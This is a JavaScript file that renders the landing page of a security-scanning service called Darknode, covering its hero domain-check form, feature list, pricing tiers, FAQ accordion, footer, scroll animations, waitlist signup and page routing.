            <div class="gov-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l8 3v6c0 4.5-3.4 8.2-8 9-4.6-.8-8-4.5-8-9V6z"/><path d="M9 12l2 2 4-4"/></svg></div>
            <h3>Vulnerability deadlines</h3>
            <p>Import Nessus, Tenable, Qualys, OpenVAS, Rapid7, Trivy, Grype, Snyk or SARIF exports into one register, ranked by CISA KEV, EPSS and CVSS, with SLA due dates that include the BOD 22-01 clock for internet-facing KEV entries.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M7 3h7l5 5v13H7z"/><path d="M14 3v5h5M10 13h6M10 17h6"/></svg></div>
            <h3>Controls and audit evidence</h3>
            <p>Assess controls against CIS, ISO 27001, SOC 2, PCI DSS, HIPAA, GDPR and NIST CSF, and group open findings by the controls they cite for an evidence pack.</p>
          </div>
        </div>
        <p class="lt-note">Vulnerability deadlines come with Pro; the compliance tools come with Enterprise. <a href="/pricing">Compare plans</a></p>
      </div>
    </section>
`,
};

export function renderLanding(view, actions) {
  // Sections that moved off the home page keep their old links: /#nexus now opens /nexus.
  const MOVED = { "#nexus": "/nexus", "#security-knowledge": "/security-knowledge", "#darknode-os": "/darknode-os", "#government": "/government" };
  if (location.pathname === "/" && MOVED[location.hash]) history.replaceState(null, "", MOVED[location.hash]);
  const path = location.pathname.replace(/\/+$/, "") || "/";
  const pageOnly = PAGE_ONLY[path] ? PAGE_ONLY[path]() : "";
  setTimeout(() => loadHeroLive(view), 0);
  queueMicrotask(() => mountLandingCheck(view, actions)); // hero domain check, or the /check/<domain> page
  view.innerHTML = `

    <!-- ====== HERO ====== -->
    <section class="hero" aria-label="Hero">
      <div class="hero-mesh"></div>
      <div class="hero-grain"></div>
      <div class="wrap hero-inner">
        <div class="hx-grid"><div class="hx-copy">
        <div class="hero-badge"><span class="badge-dot"></span> Deterministic &middot; Explainable &middot; Offline in the CLI and desktop app</div>
        <h1 class="hero-h1">Find the real risks in your<br><span class="hero-rotate-wrap"><span class="hero-rotate" id="hero-rotate">code</span></span></h1>
        <p class="hero-sub">Darknode checks your domains, code, cloud, dependencies and configs for real vulnerabilities and risks, with deterministic engines that show how they reached each result. No black-box AI deciding severity. The CLI and desktop app run on your own machines and work offline with local Ollama models.</p>
        <form class="dmc-form" id="dmcForm" novalidate>
          <label class="dmc-lbl" for="dmcIn">Check your domain</label>
          <div class="dmc-field"><input id="dmcIn" type="text" inputmode="url" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="example.com" aria-describedby="dmcHelp"><button class="btn lg" type="submit">Check domain</button></div>
          <p class="dmc-help" id="dmcHelp">Free, no sign-up, results in seconds. Reads public DNS records and HTTP headers: email authentication, HTTPS, security headers, DNSSEC, CAA and security.txt.</p>
          <p class="dmc-msg" role="alert" hidden></p>
        </form>
        <div class="hero-cta">
          <button class="btn lg ghost" id="cta-start">Create a free account</button>
          <a class="btn lg ghost" href="/?app=1">See the Deck</a>
        </div>
        </div>
        <aside class="hx-live" id="hxLive" aria-label="Newly exploited vulnerabilities">
          <div class="hx-live-h"><span class="hx-dot"></span><b>Newly exploited</b><span class="hx-src">CISA KEV</span></div>
          <div class="hx-live-b" id="hxLiveB"><div class="hx-live-msg">Loading the live feed…</div></div>
          <div class="hx-live-f" id="hxLiveF">Real vulnerabilities attackers are using now, refreshed daily. The Deck matches them against what you run.</div>
        </aside>
        <div class="dmc-out" id="dmcOut" aria-live="polite" hidden></div>
        </div>
      </div>
    </section>

    <!-- ====== WHAT IT CHECKS ====== -->
    <section class="section lt-sec" id="features" aria-labelledby="features-title">
      <div class="wrap">
        <div class="sec-label">What it checks</div>
        <h2 class="sec-title" id="features-title">Find what attackers exploit first, then fix it.</h2>
        <p class="sec-sub">Darknode checks your domain, code, cloud and dependencies for the weaknesses being exploited now, ranks what it finds, and tells you exactly how to fix each one.</p>
        <div class="lt-grid">
          ${CHECKS.map((c) => `<div class="lt-card"><div class="lt-card-h"><span class="lt-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${c.icon}</svg></span><h3>${c.title}</h3></div><p>${c.what}</p><p class="lt-fix"><b>You get</b> ${c.fix}</p></div>`).join("")}
        </div>
        <p class="lt-note">Domain, email and certificate checks and the live vulnerability feed are free. Code, dependency, cloud and attack-surface scanning come with Pro. <a href="/pricing">Compare plans</a></p>
      </div>
    </section>

    <!-- ====== HOW IT WORKS ====== -->
    <section class="section alt lt-sec" id="how" aria-labelledby="how-title">
      <div class="wrap">
        <div class="sec-label">How it works</div>
        <h2 class="sec-title" id="how-title">From sign-in to your first fix in four steps</h2>
        <ol class="lt-steps">
          <li class="lt-step"><div class="lt-card-h"><span class="lt-num">1</span><h3>Sign in free</h3></div><p>Open the Deck in your browser. No install and no card. Prefer your own machine? Use the desktop app or the CLI.</p></li>
          <li class="lt-step"><div class="lt-card-h"><span class="lt-num">2</span><h3>Add what you own</h3></div><p>A domain, a GitHub repository or folder, a dependency manifest, or your cloud and infrastructure-as-code files.</p></li>
          <li class="lt-step"><div class="lt-card-h"><span class="lt-num">3</span><h3>Get ranked findings</h3></div><p>Deterministic checks show where each problem is, how severe it is, and whether attackers are exploiting it now.</p></li>
          <li class="lt-step"><div class="lt-card-h"><span class="lt-num">4</span><h3>Fix and prove it</h3></div><p>Apply the fix, run the check again to confirm it is closed, and export a report for your team.</p></li>
        </ol>
      </div>
    </section>

    <!-- ====== WHERE IT RUNS ====== -->
    <section class="section lt-sec" id="products" aria-labelledby="products-title">
      <div class="wrap">
        <div class="sec-label">Where it runs</div>
        <h2 class="sec-title" id="products-title">Use it where you already work</h2>
        <div class="lt-surfaces">
          <div class="lt-surface">
            <h3>Web</h3>
            <p>The full Deck workspace in your browser. Nothing to install.</p>
            <button class="btn sm" id="surf-web" type="button">Start free</button>
          </div>
          <div class="lt-surface">
            <h3>Desktop app</h3>
            <p>The Deck for macOS, Windows and Linux, plus native tools a browser cannot run: a terminal, port scanner and web fuzzer.</p>
            ${APP_DL_LIVE ? `<div class="bento-dl">
              <a class="btn sm" id="app-dl" href="${APP_RELEASES}" target="_blank" rel="noopener">Download the app</a>
              <a class="bento-dl-alt" id="app-dl-alt" href="${APP_RELEASES}" target="_blank" rel="noopener">Other platforms</a>
            </div>` : `<span class="lt-tag">macOS &middot; Windows &middot; Linux</span>`}
          </div>
          <div class="lt-surface">
            <h3>CLI</h3>
            <!-- NPM_SUSPENDED: restore <code>npm i -g darknode-cli</code> when the npm account is back -->
            <p>Port scans of hosts you may test, plus dependency and environment-variable audits, with a strict mode that fails a CI build. Installs from source.</p>
            <a class="lt-link" href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">darknode-cli on GitHub</a>
          </div>
          <div class="lt-surface">
            <h3>API and MCP</h3>
            <p>Give Claude, Cursor, Codex or any MCP client the Deck's 32 analysis tools, limited to your plan. The CLI also serves the engines as a local REST API.</p>
            <span class="lt-tag">darknode mcp</span>
          </div>
        </div>
        <nav class="lt-more" aria-label="More from Darknode">
          <span class="lt-more-h">More from Darknode</span>
          <a href="/nexus">Nexus, the terminal coding agent</a>
          <a href="/security-knowledge">Security knowledge base</a>
          <a href="/darknode-os">Darknode OS</a>
          <a href="/government">Government and regulated teams</a>
        </nav>
      </div>
    </section>
${pageOnly}

    <!-- ====== PRICING ====== -->
    <section class="section alt" id="pricing" aria-labelledby="pricing-title">
      <div class="wrap">
        <div class="sec-label">Pricing</div>
        <h2 class="sec-title" id="pricing-title">Free to start. Upgrade when you're ready.</h2>
        <p class="sec-sub">Start free. Paid plans add more tools, premium AI models and higher limits.</p>
        <div class="pricing-grid" id="pricing-grid">
          <div class="price-card">
            <div class="price-tier">Free</div>
            <div class="price-amount">$0<span class="price-period">/forever</span></div>
            <p class="price-desc">Quick checks, the live feed and the assistant, for individuals and evaluation.</p>
            <ul class="price-features compact">
              <li>Free browser tools in the Tool Library</li>
              <li>Quick Checks: email security, headers, certificates, DNS, breaches, CVEs</li>
              <li>Personal space: domain, link, secret and data checks</li>
              <li>Live vulnerability feed (CVE and known-exploited)</li>
              <li>Local-only security graph &amp; case files</li>
              <li>Watch 1 domain: certificate expiry and email/DNS changes, alerts by email</li>
              <li>Darknode AI assistant: 50 messages a day</li>
              <li>1 workspace, 1 seat</li>
            </ul>
            <button class="btn lg" id="price-free">Get started free</button>
          </div>
          <div class="price-card featured">
            <div class="price-badge">Recommended</div>
            <div class="price-tier">Pro</div>
            <div class="price-amount">$29<span class="price-period">/user/month</span></div>
            <p class="price-desc">Built for working security professionals.</p>
            <ul class="price-features compact">
              <li>Everything in Free, plus:</li>
              <li>Exposure and Application Security tools, findings and reports</li>
              <li>Unlimited saved findings &amp; reports</li>
              <li>Premium AI models: Claude Fable 5.1, Claude Opus 5.5, Darknode Max</li>
              <li>500 AI messages a day (150 on Claude)</li>
              <li>Known-exploited CVE monitors, with Cyber Resilience Act and BOD 22-01 deadline clocks</li>
              <li>Cloud sync across devices</li>
              <li>Email support</li>
            </ul>
            <button class="btn lg ghost" id="price-pro">Join waitlist</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Team</div>
            <div class="price-amount">$79<span class="price-period">/user/month</span></div>
            <p class="price-desc">Shared findings and workflow for a security team.</p>
            <ul class="price-features compact">
              <li>Everything in Pro, plus:</li>
              <li>Organization space, Identity, Security Operations, Fraud &amp; Abuse</li>
              <li>Shared team workspaces &amp; roles</li>
              <li>1,000 AI messages a day per user</li>
              <li>Integrations (ticketing, chat webhooks)</li>
              <li>Activity &amp; audit log</li>
            </ul>
            <button class="btn lg ghost" id="price-team">Join waitlist</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Enterprise</div>
            <div class="price-amount">Custom</div>
            <p class="price-desc">Control, compliance, and scale for organizations.</p>
            <ul class="price-features compact">
              <li>Everything in Team, plus:</li>
              <li>Risk &amp; Resilience and Compliance tools</li>
              <li>Private deployment</li>
              <li>SSO &amp; MFA (on the roadmap), custom roles</li>
              <li>Compliance pack &amp; DPA</li>
              <li>Dedicated support</li>
            </ul>
            <button class="btn lg ghost" id="price-enterprise">Contact sales</button>
          </div>
        </div>
        <p class="pricing-note">Paid plans are in preview: checkout is not live yet, so upgrades are requested and granted by hand and no payment is taken. There is no per-token AI billing: each plan includes a daily message allowance, and you can also connect your own key or run a local model with Nexus.</p>
      </div>
    </section>

    <!-- ====== FAQ (the first six here; /faq shows every question) ====== -->
    <section class="section lt-sec" id="faq" aria-labelledby="faq-title">
      <div class="wrap">
        <div class="sec-label">FAQ</div>
        <h2 class="sec-title" id="faq-title">Frequently asked questions</h2>
        <div class="faq-list">
          ${FAQ.map(([q, a, more]) => `<div class="faq-item"${more ? " data-faq-more hidden" : ""}><button class="faq-q" type="button" aria-expanded="false"><span class="faq-q-text">${q}</span><span class="faq-toggle" aria-hidden="true">+</span></button><div class="faq-a" hidden><div class="faq-a-inner">${a}</div></div></div>`).join("")}
        </div>
        <p class="lt-faq-all" id="faq-all"><a href="/faq">See all questions</a></p>
      </div>
    </section>

    <!-- ====== CTA ====== -->
    <section class="cta-final" id="start" aria-labelledby="cta-title">
      <div class="wrap cta-inner">
        <h2 id="cta-title">See what attackers would find first.</h2>
        <p class="cta-sub">Start with a free check of your own domain. No card and nothing to install.</p>
        <button class="btn lg" id="cta-signup" type="button">Get started &rarr;</button>
        <div class="cta-notify lt-notify">
          <h3 class="cta-notify-h">Get notified when Pro launches</h3>
          <form class="cta-form" id="cta-notify-form" autocomplete="off">
            <input type="email" class="cta-email" id="cta-email" placeholder="test@darknode.ai" required aria-label="Email address">
            <button type="submit" class="btn ghost" id="cta-notify-btn">Notify me</button>
          </form>
          <p class="cta-reassure" id="cta-reassure">No spam. One email when we launch.</p>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="land-footer">
      <div class="wrap land-footer-inner lf-grid">
        <div class="lf-brand">
          <span class="land-footer-brand">Darknode</span>
          <p class="lf-tag">Finds the weaknesses attackers exploit in your domain, code, cloud and dependencies, and tells you how to fix them.</p>
        </div>
        <nav class="lf-col" aria-label="Product">
          <h4>Product</h4>
          <a href="/features">Features</a>
          <a href="/pricing">Pricing</a>
          <a href="/nexus">Nexus</a>
          <a href="/darknode-os">Darknode OS</a>
          <a href="/government">Government</a>
        </nav>
        <nav class="lf-col" aria-label="Resources">
          <h4>Resources</h4>
          <a href="/faq">FAQ</a>
          <a href="/security-knowledge">Security knowledge</a>
          <a href="${GITHUB}" target="_blank" rel="noopener">GitHub</a>
          <a href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">CLI source</a>
        </nav>
        <nav class="lf-col" aria-label="Legal">
          <h4>Legal</h4>
          <a href="/terms">Terms</a>
          <a href="/privacy">Privacy</a>
          <a href="/acceptable-use">Acceptable Use</a>
        </nav>
      </div>
      <div class="wrap lf-bottom">
        <span class="land-footer-copy">&copy; 2026 Darknode. All rights reserved.</span>
        <span>For authorized use on systems you own or are permitted to assess.</span>
      </div>
    </footer>
`;

  const $ = (id) => view.querySelector("#" + id);
  $("cta-start").onclick = actions.onGetStarted;
  $("cta-signup").onclick = actions.onGetStarted;
  if ($("price-free")) $("price-free").onclick = actions.onGetStarted;
  if ($("surf-web")) $("surf-web").onclick = actions.onGetStarted;

  // Desktop-app download button — label it for the visitor's OS and, on click,
  // resolve the matching installer from the latest release (fallback: releases page).
  const appDl = APP_DL_LIVE && $("app-dl");
  if (appDl) {
    const os = appDetectOS();
    appDl.textContent = "Download for " + (APP_OS_LABEL[os] || "your OS");
    appDl.addEventListener("click", async (e) => {
      e.preventDefault();
      const prev = appDl.textContent;
      appDl.textContent = "Finding latest build...";
      appDl.style.pointerEvents = "none";
      const url = await appResolveAsset(os);
      appDl.textContent = prev;
      appDl.style.pointerEvents = "";
      if (url) window.location.href = url;
      else window.open(APP_RELEASES, "_blank", "noopener");
    });
  }

  const scrollToCta = () => { const el = view.querySelector(".cta-notify"); if (el) el.scrollIntoView({ behavior: "smooth", block: "center" }); const inp = $("cta-email"); if (inp) inp.focus({ preventScroll: true }); };
  if ($("price-pro")) $("price-pro").onclick = scrollToCta;
  if ($("price-team")) $("price-team").onclick = scrollToCta;
  if ($("price-enterprise")) $("price-enterprise").onclick = scrollToCta;

  // Animated counter for hero stats — scroll-triggered with easing
  const counterEls = view.querySelectorAll("[data-count]");
  function formatNum(n, fmt) { return fmt === "comma" ? n.toLocaleString("en-US") : String(n); }
  function animateCounter(el) {
    if (el._counted) return;
    el._counted = true;
    const target = parseInt(el.dataset.count);
    const suffix = el.dataset.suffix || "";
    const fmt = el.dataset.format || "";
    const duration = 1500;
    const start = performance.now();
    function tick(now) {
      const t = Math.min((now - start) / duration, 1);
      const ease = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = Math.round(ease * target);
      el.textContent = formatNum(current, fmt) + suffix;
      if (t < 1) requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
  }
  if ("IntersectionObserver" in window) {
    const trustWrap = view.querySelector('.hero-trust');
    if (trustWrap) {
      const trustIO = new IntersectionObserver((entries) => {
        entries.forEach(e => { if (e.isIntersecting) { counterEls.forEach(el => animateCounter(el)); trustIO.disconnect(); } });
      }, { threshold: 0.1 });
      trustIO.observe(trustWrap);
    } else {
      counterEls.forEach(el => animateCounter(el));
    }
  } else {
    counterEls.forEach(el => animateCounter(el));
  }

  // /cheap before-and-after table: real replay data, loaded when the Nexus section is near.
  const cheapBox = view.querySelector("[data-nx-cheap]");
  if (cheapBox) {
    const escT = (t) => String(t).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
    const fillCheap = () => fetch("/data/nexus-cheap-replay.json").then((r) => { if (!r.ok) throw new Error(r.status); return r.json(); }).then((d) => {
      const usd = (n) => "$" + n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      cheapBox.querySelector(".nx-cmds-foot").remove();
      cheapBox.insertAdjacentHTML("beforeend",
        '<div class="nx-cheap-scroll"><table class="nx-cheap-t"><thead><tr><th>Model</th><th>Without /cheap</th><th>With /cheap</th><th>Saved</th></tr></thead><tbody>' +
        d.models.map((m) => "<tr><td>" + escT(m.label) + "</td><td>" + usd(m.before) + "</td><td>" + usd(m.after) + "</td><td><strong>" + usd(m.saved) + " (" + m.pct + "%)</strong></td></tr>").join("") +
        '</tbody></table></div><p class="nx-cmds-foot">Measured on ' + d.sample.calls.toLocaleString("en-US") + " real requests from " + d.sample.sessions + " sessions over " + d.period.days + " days, replayed with and without /cheap and priced at each model\u2019s list rates. Keep-alive pings are charged. Most of the saving comes from keeping the prompt cache warm through breaks, so it assumes Nexus stays open; your share depends on how often you step away.</p>");
    }).catch(() => { cheapBox.remove(); });
    if ("IntersectionObserver" in window) {
      const io = new IntersectionObserver((es) => { if (es.some((e) => e.isIntersecting)) { io.disconnect(); fillCheap(); } }, { rootMargin: "400px" });
      io.observe(cheapBox);
    } else fillCheap();
  }

  // Hero text rotation
  const words = ["code", "cloud", "dependencies", "configs", "records"];
  let wordIdx = 0;
  const rotateEl = $("hero-rotate");
  if (rotateEl) {
    const wrap = rotateEl.parentElement;
    if (wrap) {
      let maxW = 0;
      const orig = rotateEl.textContent;
      for (const w of words) { rotateEl.textContent = w; maxW = Math.max(maxW, rotateEl.scrollWidth); } // scrollWidth: the word box spans the wrap (0 wide until sized)
      rotateEl.textContent = orig;
      wrap.style.minWidth = maxW + "px";
    }
    setInterval(() => {
      wordIdx = (wordIdx + 1) % words.length;
      rotateEl.style.opacity = "0";
      rotateEl.style.transform = "translateY(-8px)";
      setTimeout(() => {
        rotateEl.style.transition = "none";
        rotateEl.style.transform = "translateY(8px)";
        rotateEl.textContent = words[wordIdx];
        requestAnimationFrame(() => {
          rotateEl.style.transition = "opacity .25s,transform .25s";
          rotateEl.style.opacity = "1";
          rotateEl.style.transform = "translateY(0)";
        });
      }, 250);
    }, 3000);
  }

  // Scroll reveal -- staggered section-level reveal for premium cascading feel.
  // When a section scrolls into view, all its reveal-target children fade in
  // with incremental delays (each child +0.07s after the previous, capped at 0.42s).
  if ("IntersectionObserver" in window) {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    const REVEAL_SEL = ".sec-label,.sec-title,.sec-sub,.bento-card,.price-card,.feature-row,.tlv-step,.nx-card,.gh-card,.pricing-note,.nx-details,.hero-trust,.hero-built-with,.faq-item,.cmp-landing,.ts-card,.ts-tabs,.nx-arch-layer,.nx-hl,.nx-arch,.metric-card,.rag-tabs,.rag-card,.showcase-tabs,.showcase-window,.showcase-hint,.plab-card,.plab-note,.os-card,.os-boot-preview";
    if (!reduce) {
      const sectionIO = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (!entry.isIntersecting) return;
          sectionIO.unobserve(entry.target);
          const children = entry.target.querySelectorAll(REVEAL_SEL);
          children.forEach((child, i) => {
            child.style.transitionDelay = Math.min(i * 0.07, 0.42) + "s";
          });
          // rAF ensures transition-delay is applied before class triggers transition
          requestAnimationFrame(() => {
            children.forEach(child => child.classList.add("revealed"));
            // cta-final itself is a reveal target (no children in REVEAL_SEL)
            if (entry.target.matches(".cta-final")) {
              entry.target.classList.add("revealed");
            }
          });
        });
      }, { threshold: 0.08, rootMargin: "0px 0px -40px 0px" });
      view.querySelectorAll(".section, .hero, .cta-final").forEach(sec => sectionIO.observe(sec));
      // Fallback: reveal anything already visible, and reveal all after 3s max
      setTimeout(() => { const wh = window.innerHeight + 200; const els = [...view.querySelectorAll(REVEAL_SEL)]; const tops = els.map(el => el.getBoundingClientRect().top); els.forEach((el, i) => { if (tops[i] < wh) el.classList.add("revealed"); }); }, 300);
      setTimeout(() => { view.querySelectorAll(REVEAL_SEL).forEach(el => el.classList.add("revealed")); }, 3000);
    } else {
      // Reduced motion: make everything visible immediately, no transitions
      view.querySelectorAll(REVEAL_SEL + ",.cta-final").forEach(el => el.classList.add("revealed"));
    }
  }

  // Top scroll-progress bar (body.landing::before reads --scrollp) + parallax on
  // .section.alt backgrounds. Both are driven from one rAF-throttled scroll handler.
  (function() {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    const altSections = reduce ? [] : view.querySelectorAll(".section.alt");
    const bodyStyle = document.body.style;
    let ticking = false;
    function updateScrollUi() {
      // Scroll progress: fraction of the document scrolled. Recomputing scrollHeight
      // every frame keeps the value correct when the page grows mid-scroll (images,
      // reveals); the CSS transition smooths the resulting adjustment so it never
      // visibly jumps backward.
      const el = document.scrollingElement || document.documentElement;
      const max = el.scrollHeight - el.clientHeight;
      const p = max > 0 ? Math.min(1, Math.max(0, el.scrollTop / max)) : 0;
      bodyStyle.setProperty("--scrollp", p.toFixed(4));
      if (altSections.length) {
        const vh = window.innerHeight;
        altSections.forEach(function(sec) {
          const rect = sec.getBoundingClientRect();
          const progress = (vh - rect.top) / (vh + rect.height);
          const clamped = Math.max(0, Math.min(1, progress));
          sec.style.setProperty("--px-x", ((clamped - 0.5) * 80) + "px");
          sec.style.setProperty("--px-y", ((clamped - 0.5) * 60) + "px");
        });
      }
      ticking = false;
    }
    function onScroll() { if (!ticking) { ticking = true; requestAnimationFrame(updateScrollUi); } }
    window.addEventListener("scroll", onScroll, { passive: true });
    window.addEventListener("resize", onScroll, { passive: true });
    updateScrollUi();
  })();

  // Smooth scroll for anchor links within the landing page
  view.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener("click", (e) => {
      const href = link.getAttribute("href");
      if (!href || href === "#") return;
      const target = view.querySelector(href);
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    });
  });

  // Keyboard accessibility: make pricing cards focusable
  view.querySelectorAll(".bento-card, .nx-card, .gh-card").forEach(el => {
    if (!el.getAttribute("tabindex") && !el.closest("a")) {
      el.setAttribute("tabindex", "0");
    }
  });

  // FAQ accordion
  view.querySelectorAll(".faq-q").forEach(btn => {
    btn.addEventListener("click", () => {
      const item = btn.closest(".faq-item");
      const panel = item.querySelector(".faq-a");
      const toggle = btn.querySelector(".faq-toggle");
      const isOpen = item.classList.contains("open");

      if (isOpen) {
        // Collapse: animate from current height to 0
        panel.style.maxHeight = panel.scrollHeight + "px";
        requestAnimationFrame(() => {
          panel.style.maxHeight = "0";
        });
        item.classList.remove("open");
        btn.setAttribute("aria-expanded", "false");
        toggle.textContent = "+";
        panel.addEventListener("transitionend", function handler() {
          panel.hidden = true;
          panel.removeEventListener("transitionend", handler);
        });
      } else {
        // Expand: reveal then animate from 0 to scrollHeight
        panel.hidden = false;
        panel.style.maxHeight = "0";
        requestAnimationFrame(() => {
          panel.style.maxHeight = panel.scrollHeight + "px";
        });
        item.classList.add("open");
        btn.setAttribute("aria-expanded", "true");
        toggle.textContent = "−";
        panel.addEventListener("transitionend", function handler() {
          panel.style.maxHeight = "none";
          panel.removeEventListener("transitionend", handler);
        });
      }
    });
  });

  // Security Knowledge RAG tabs
  const ragTabs = view.querySelectorAll(".rag-tab");
  const ragPanels = view.querySelectorAll(".rag-panel");
  ragTabs.forEach(tab => {
    tab.addEventListener("click", () => {
      const target = tab.dataset.rag;
      ragTabs.forEach(t => {
        const active = t.dataset.rag === target;
        t.classList.toggle("active", active);
        t.setAttribute("aria-selected", active ? "true" : "false");
      });
      ragPanels.forEach(p => {
        const active = p.dataset.ragPanel === target;
        p.classList.toggle("active", active);
        if (active) {
          // Re-trigger reveal on newly visible cards
          p.querySelectorAll(".rag-card").forEach(c => c.classList.add("revealed"));
        }
      });
    });
    // Keyboard navigation for RAG tabs (left/right arrows)
    tab.addEventListener("keydown", (e) => {
      const tabList = Array.from(ragTabs);
      const idx = tabList.indexOf(tab);
      let next = -1;
      if (e.key === "ArrowRight") next = (idx + 1) % tabList.length;
      else if (e.key === "ArrowLeft") next = (idx - 1 + tabList.length) % tabList.length;
      if (next >= 0) {
        e.preventDefault();
        tabList[next].focus();
        tabList[next].click();
      }
    });
  });

  // Newsletter signup — store email in Firestore "waitlist" collection
  const notifyForm = $("cta-notify-form");
  const notifyEmail = $("cta-email");
  const notifyBtn = $("cta-notify-btn");
  const notifyMsg = $("cta-reassure");
  if (notifyForm) {
    notifyForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = (notifyEmail.value || "").trim().toLowerCase();
      if (!email) return;
      notifyBtn.disabled = true;
      notifyBtn.textContent = "Sending...";
      try {
        await addDoc(collection(db, "waitlist"), {
          email,
          source: "landing-cta",
          createdAt: serverTimestamp()
        });
        notifyMsg.textContent = "You are on the list. We will email you when Pro launches.";
        notifyMsg.classList.remove("cta-reassure-err");
        notifyMsg.classList.add("cta-reassure-ok");
        notifyEmail.value = "";
        notifyBtn.textContent = "Done";
      } catch (err) {
        notifyMsg.textContent = "Something went wrong. Please try again.";
        notifyMsg.classList.remove("cta-reassure-ok");
        notifyMsg.classList.add("cta-reassure-err");
        notifyBtn.disabled = false;
        notifyBtn.textContent = "Notify me";
      }
    });
  }

  // Dedicated pages: each shows only its own sections and hides the rest of the home page.
  // /nexus, /security-knowledge, /darknode-os and /government are not on the home page at all:
  // PAGE_ONLY renders them only at their own path.
  const PAGE_ROUTES = { "/pricing": ["pricing", "start"], "/faq": ["faq"], "/features": ["features", "how", "products"], "/nexus": ["nexus"], "/security-knowledge": ["security-knowledge"], "/darknode-os": ["darknode-os"], "/government": ["government"] };
  const PAGE_TITLES = { "/pricing": "Pricing", "/faq": "FAQ", "/features": "Features", "/nexus": "Nexus", "/security-knowledge": "Security knowledge", "/darknode-os": "Darknode OS", "/government": "Government and regulated teams" };
  const dedicated = PAGE_ROUTES[path];
  if (dedicated) {
    view.querySelectorAll(".section, .hero, .cta-final").forEach(sec => {
      if (!dedicated.includes(sec.id)) sec.hidden = true;
    });
    const target = view.querySelector("#" + dedicated[0]);
    // the hidden hero holds the home page's h1, so the section title becomes this page's h1
    const h2 = target && target.querySelector("h2.sec-title");
    if (h2) { const h1 = document.createElement("h1"); for (const a of h2.attributes) h1.setAttribute(a.name, a.value); h1.innerHTML = h2.innerHTML; h2.replaceWith(h1); }
    if (target) {
      const back = document.createElement("div");
      back.className = "dedicated-page-header";
      back.innerHTML = '<a class="dedicated-back" href="/"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg> Back to home</a>';
      back.querySelector("a").addEventListener("click", (e) => { e.preventDefault(); window.location.href = "/"; });
      target.insertAdjacentElement("beforebegin", back);
    }
    // the home page shows the first six questions; /faq shows every one
    if (path === "/faq") { view.querySelectorAll("[data-faq-more]").forEach((el) => { el.hidden = false; }); if ($("faq-all")) $("faq-all").hidden = true; }
    document.title = (PAGE_TITLES[path] || "Darknode") + " — Darknode";
    window.scrollTo(0, 0);
  } else if (path === "/" && location.hash.length > 1) {
    // a link to a home section (/#pricing) lands on it: the section did not exist when the browser looked
    const t = document.getElementById(decodeURIComponent(location.hash.slice(1)));
    if (t) requestAnimationFrame(() => t.scrollIntoView());
  }

  // Public tool pages: published open data that needs no account. The sitemap and the app
  // manifest link these, so a signed-out visitor must get the tool, not the home page.
  const legal = (id) => () => import("/js/legal.js?v=20261102a").then((m) => (mount) => m.renderLegal(mount, id));
  const PUBLIC_TOOLS = { "/crosswalk": { title: "GenAI Security Crosswalk", load: () => import("/js/crosswalk.js?v=20261029c").then((m) => m.renderCrosswalk) },
    "/terms": { title: "Terms of Service", load: legal("terms"), note: "" }, "/privacy": { title: "Privacy Policy", load: legal("privacy"), note: "" }, "/acceptable-use": { title: "Acceptable Use Policy", load: legal("aup"), note: "" } };
  const pub = PUBLIC_TOOLS[location.pathname];
  if (pub) {
    view.querySelectorAll(".section, .hero, .cta-final").forEach((sec) => { sec.hidden = true; });
    const page = document.createElement("section");
    page.className = "section dn-pubtool";
    page.innerHTML = '<div class="wrap"><div class="dedicated-page-header dn-pubbar"><a class="dedicated-back" href="/"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg> Back to home</a><span class="dn-pubnote">' + (pub.note ?? "Free to use, no account needed.") + '</span><button class="btn sm" type="button">Sign in for the full platform</button></div><div class="dn-pubmain"></div></div>';
    page.querySelector(".dedicated-back").addEventListener("click", (e) => { e.preventDefault(); window.location.href = "/"; });
    page.querySelector(".dn-pubbar .btn").addEventListener("click", () => actions && actions.onSignIn && actions.onSignIn());
    view.prepend(page);
    const mount = page.querySelector(".dn-pubmain");
    // the page renders after load, so a #section link (security.txt's Policy) scrolls once it exists
    pub.load().then((render) => render(mount)).then(() => { const t = location.hash.length > 1 && document.getElementById(decodeURIComponent(location.hash.slice(1))); if (t) t.scrollIntoView(); }).catch(() => { mount.textContent = "Couldn't load this tool. Check your connection and reload."; });
    document.title = pub.title + " — Darknode";
    window.scrollTo(0, 0);
  }

  // Any other path that the app does not route either (a mistyped or retired link) gets a real
  // "Page not found" instead of a copy of the home page at that URL. Pages the signed-in app opens
  // (/<tool>, /all-tools, /console/...) keep the landing: signing in then opens that page.
  if (!dedicated && !pub && !PUBLIC_TOOLS[path] && actions && actions.isAppPath && !actions.isAppPath(location.pathname)) {
    view.querySelectorAll(".section, .hero, .cta-final").forEach((sec) => { sec.hidden = true; });
    const page = document.createElement("section");
    page.className = "section dn-notfound";
